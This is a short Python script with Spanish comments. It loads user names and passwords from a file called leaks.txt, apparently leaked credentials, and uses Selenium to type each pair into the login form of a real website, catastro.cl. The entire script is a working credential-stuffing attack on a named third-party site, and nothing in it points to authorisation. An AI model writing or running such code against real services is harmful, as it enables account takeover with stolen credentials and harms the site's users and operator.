import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

#obtener los datos
leaks = pd.read_csv('./leaks.txt',sep="\t",header=None)

#SObtener usuairos y consrtasenas, solo tomaremos los primero 20
user = leaks.iloc[:,0]
pwd = leaks.iloc[:,-1]
user = user[1:-22]
pwd = pwd[1:-22]

driver = webdriver.Chrome("./chromedriver")
driver.get("https://www.catastro.cl/")
driver.set_window_size(1920,1080)
driver.refresh()



for index in range(len(user)):
    usuario_name = driver.find_element_by_xpath('//*[@id="log_use"]')
    usuario_pass = driver.find_element_by_xpath('//*[@id="log_pas"]')
    usuario_name.send_keys(user[index+1])
    usuario_pass.send_keys(pwd[index+1])
    time.sleep(5)
    usuario_pass.send_keys(Keys.ENTER)
    usuario_name.clear()
    usuario_pass.clear()
